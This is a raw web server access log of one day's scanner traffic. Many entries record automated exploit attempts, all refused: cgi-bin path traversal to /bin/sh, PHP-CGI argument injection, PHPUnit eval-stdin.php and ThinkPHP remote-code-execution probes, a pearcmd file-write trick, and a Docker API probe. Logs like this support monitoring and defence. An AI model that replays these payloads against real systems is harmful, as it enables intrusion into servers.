185.180.140.110 - - [17/Dec/2025:13:05:05 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
147.185.132.105 - - [17/Dec/2025:13:45:09 +0700] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xC5\xF9t\xADk\xD2\xAA\xBC\x19\x10]\xEB\xFFn5\x93\x86\x89\xC0`\x8C\x8E\x18\xB1Lp\xC5H\xBE\x1C\xEB\x88\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 157 "-" "-"
147.185.132.105 - - [17/Dec/2025:13:45:09 +0700] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xAD\xCA\x06\xA0(\xD6\xA8\x86\x1F\xA2\xE1nH\xD8\xCBb<~\xF7t\xCF!\xD04A\xB6Y\x9A\xCEa\xB0\x1B \xE6\x11\x0Cp^m4\x86\x84L\x19$\xCE\xD1VB\xB0\xDBs\x05b'd3\xFB\xBF7\xE3'\xEB#@\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-"
91.224.92.121 - - [17/Dec/2025:13:52:54 +0700] "OPTIONS / HTTP/1.1" 405 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36"
204.76.203.214 - - [17/Dec/2025:13:53:05 +0700] "GET /SDK/webLanguage HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
101.32.218.31 - - [17/Dec/2025:14:07:26 +0700] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
204.76.203.8 - - [17/Dec/2025:14:14:12 +0700] "GET / HTTP/1.1" 200 615 "-" "-"
204.76.203.8 - - [17/Dec/2025:14:14:12 +0700] "POST /HNAP1/ HTTP/1.1" 404 153 "-" "Mozila/5.0"
141.98.11.140 - - [17/Dec/2025:14:53:07 +0700] "GET / HTTP/1.1" 200 615 "-" "-"
101.32.218.31 - - [17/Dec/2025:15:47:46 +0700] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
158.220.81.232 - - [17/Dec/2025:15:47:53 +0700] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 157 "-" "-"
158.220.81.232 - - [17/Dec/2025:15:47:54 +0700] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 157 "-" "-"
158.220.81.232 - - [17/Dec/2025:15:47:54 +0700] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:47:54 +0700] "POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 405 157 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:47:55 +0700] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:47:55 +0700] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:47:55 +0700] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:47:56 +0700] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:47:56 +0700] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:47:56 +0700] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:47:57 +0700] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:47:57 +0700] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:47:57 +0700] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:47:58 +0700] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:47:58 +0700] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:47:58 +0700] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:47:59 +0700] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:47:59 +0700] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:48:00 +0700] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:48:00 +0700] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:48:00 +0700] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:48:01 +0700] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:48:01 +0700] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:48:01 +0700] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:48:02 +0700] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:48:02 +0700] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:48:02 +0700] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:48:03 +0700] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:48:03 +0700] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:48:03 +0700] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:48:04 +0700] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:48:04 +0700] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:48:04 +0700] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:48:04 +0700] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:48:05 +0700] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:48:05 +0700] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:48:05 +0700] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:48:06 +0700] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:48:06 +0700] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:48:06 +0700] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:48:07 +0700] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:48:07 +0700] "GET /index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:48:07 +0700] "GET /public/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:48:08 +0700] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\x22hi\x22));?>+/tmp/index1.php HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:48:08 +0700] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 404 153 "-" "libredtail-http"
158.220.81.232 - - [17/Dec/2025:15:48:08 +0700] "GET /containers/json HTTP/1.1" 404 153 "-" "libredtail-http"
157.245.209.233 - - [17/Dec/2025:15:58:11 +0700] "GET /admin/config.php HTTP/1.0" 404 153 "-" "xfa1,nvdorz,nvd0rz"
43.130.37.243 - - [17/Dec/2025:16:38:55 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
13.89.125.26 - - [17/Dec/2025:17:41:37 +0700] "GET /druid/index.html HTTP/1.1" 404 153 "-" "Mozilla/5.0 zgrab/0.x"
43.133.139.6 - - [17/Dec/2025:17:55:04 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
45.61.150.177 - - [17/Dec/2025:18:14:14 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
45.61.150.177 - - [17/Dec/2025:18:14:14 +0700] "\x16\x03\x01\x00\xF2\x01\x00\x00\xEE\x03\x03@p\xD2=\x05\x1F\xA3\x0B4|\x9C\xFF\xEF\xDD\xA3\xC3\x8D\x9EQ'\xE0_\xE4\x96\xBE\xD3nA\x9F\x06" 400 157 "-" "-"
93.174.93.12 - - [17/Dec/2025:19:44:23 +0700] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 157 "-" "-"
54.224.216.139 - - [17/Dec/2025:19:59:57 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
93.174.93.12 - - [17/Dec/2025:20:16:41 +0700] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 157 "-" "-"
96.126.104.20 - - [17/Dec/2025:20:29:55 +0700] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\x14Xcq[\xA2$mg\x98\xD3\xD6X\x8B\xB5\x00%';W" 400 157 "-" "-"
207.154.194.5 - - [17/Dec/2025:20:31:27 +0700] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xF9\xD9\xB3\xAB\xFD\x06\xE1j\xDF\xCF\xB5\xD1\x14\x0EX\x17\x81\x1D\x18\x13\xBC\x02'\x9D\x99\x04\xD7?\x0C-`\xA5\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
207.154.194.5 - - [17/Dec/2025:20:31:27 +0700] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x8A\xAA$b\xF8\xCB\x08\xB0\x96\xEA\x8D\x0B\x1Db\xA9V\xF7\x89\xE37I\xFD\x9A X\x01\x90v\xF2hI\xBF\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
207.154.194.5 - - [17/Dec/2025:20:31:27 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
207.154.194.5 - - [17/Dec/2025:20:31:27 +0700] "GET /form.html HTTP/1.1" 404 153 "-" "curl/8.1.2"
207.154.194.5 - - [17/Dec/2025:20:31:28 +0700] "GET /upl.php HTTP/1.1" 404 153 "-" "Mozilla/5.0"
207.154.194.5 - - [17/Dec/2025:20:31:28 +0700] "GET /t4 HTTP/1.1" 404 153 "-" "Mozilla/5.0"
207.154.194.5 - - [17/Dec/2025:20:31:28 +0700] "GET /geoip/ HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
207.154.194.5 - - [17/Dec/2025:20:31:29 +0700] "GET /favicon.ico HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
207.154.194.5 - - [17/Dec/2025:20:31:29 +0700] "GET /1.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
207.154.194.5 - - [17/Dec/2025:20:31:29 +0700] "GET /systembc/password.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
207.154.194.5 - - [17/Dec/2025:20:31:29 +0700] "GET /password.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
101.32.218.31 - - [17/Dec/2025:20:49:31 +0700] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
91.232.238.112 - - [17/Dec/2025:21:13:51 +0700] "GET /admin/config.php HTTP/1.0" 404 153 "-" "xfa1"
45.82.78.100 - - [17/Dec/2025:21:14:24 +0700] "\x16\x03\x01\x05\xA8\x01\x00\x05\xA4\x03\x03x\xB2\xF2\x8Cq\xF6\xE6E" 400 157 "-" "-"
45.82.78.100 - - [17/Dec/2025:21:14:34 +0700] "\x16\x03\x01\x05\xA8\x01\x00\x05\xA4\x03\x03.\x14\xCB\xEC$\x9B\xFD\xF7\xFE\x01\x03\x0B\x9E\xDEK\x9B\xA5\xEB\xB7K\xE0,\xC8}\xD4\xD9X\x1A\xA0\xA1[\xA9 \x8B\xE3\x1F\xD1\x85HP[\xEB\xD2w[\xD0\x91\x84?\xB2n\xEA\xD3\xD9\xC7\xDA\xD7O\xB9\xA0\x1C^\x83'e\x00\x1A\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-"
45.82.78.100 - - [17/Dec/2025:21:14:34 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0"
45.82.78.113 - - [17/Dec/2025:21:14:59 +0700] "GET /favicon.ico HTTP/1.1" 404 555 "http://13.214.39.19/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 YaBrowser/25.8.0.0 Safari/537.36"
96.126.104.20 - - [17/Dec/2025:21:43:03 +0700] "GET /GfFi HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Safari/537.36"
165.154.231.140 - - [17/Dec/2025:21:53:49 +0700] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 157 "-" "-"
165.154.231.140 - - [17/Dec/2025:21:53:49 +0700] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 157 "-" "-"
165.154.231.140 - - [17/Dec/2025:21:53:49 +0700] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:50 +0700] "POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 405 157 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:50 +0700] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:50 +0700] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:51 +0700] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:51 +0700] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:51 +0700] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:52 +0700] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:52 +0700] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:52 +0700] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:53 +0700] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:53 +0700] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:53 +0700] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:53 +0700] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:53 +0700] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:53 +0700] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:54 +0700] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:54 +0700] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:54 +0700] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:54 +0700] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:54 +0700] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:54 +0700] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:54 +0700] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:55 +0700] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:55 +0700] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:55 +0700] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:55 +0700] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:55 +0700] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:56 +0700] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:57 +0700] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:57 +0700] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:58 +0700] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:58 +0700] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:53:59 +0700] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:54:00 +0700] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:54:00 +0700] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:54:01 +0700] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:54:01 +0700] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:54:02 +0700] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:54:02 +0700] "GET /index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:54:03 +0700] "GET /public/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:54:04 +0700] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\x22hi\x22));?>+/tmp/index1.php HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:54:05 +0700] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 404 153 "-" "libredtail-http"
165.154.231.140 - - [17/Dec/2025:21:54:05 +0700] "GET /containers/json HTTP/1.1" 404 153 "-" "libredtail-http"
96.126.104.20 - - [17/Dec/2025:22:19:32 +0700] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\xC30\x90\xC5\x02rs\xD1s\x9D_\xBD\xE8\xA3\xED\xEE\xA2\x80vC_f\x00\x87\xDD$r\x0Ey\x11\x10{ \xA9\xDB\x06\xA3\x8E\xBA\x5C\x94\xCDw\xD3Ma2\xE8P\xC7\x1F\xA54\xCD\xFDYj\x1C\xC8[\x18\x18rA\xAE\x00$\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\xC0$\xC0(\xC0#\xC0'\x00\x9F\x00\x9E\x00k\x00g\x00\xFF\x01\x00\x01\x8F\x00\x0B\x00\x04\x03\x00\x01\x02\x00" 400 157 "-" "-"
172.105.128.11 - - [17/Dec/2025:22:46:02 +0700] "\x16\x03\x01\x01" 400 157 "-" "-"
172.105.128.11 - - [17/Dec/2025:22:46:03 +0700] "\x16\x03\x01\x01" 400 157 "-" "-"
185.242.226.113 - - [17/Dec/2025:23:25:50 +0700] "\x16\x03\x01\x00\x8A\x01\x00\x00\x86\x03\x03\x0B\xBA\x91\xAF\xFC\xCDaD\xB0E1 \x85\xF9U~\xBF\x893\x8B\x0C\xE0G\xD1\xF7\xE9\x95)p[\x9DI\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
113.56.161.14 - - [17/Dec/2025:23:27:27 +0700] "GET / HTTP/1.1" 200 615 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15"
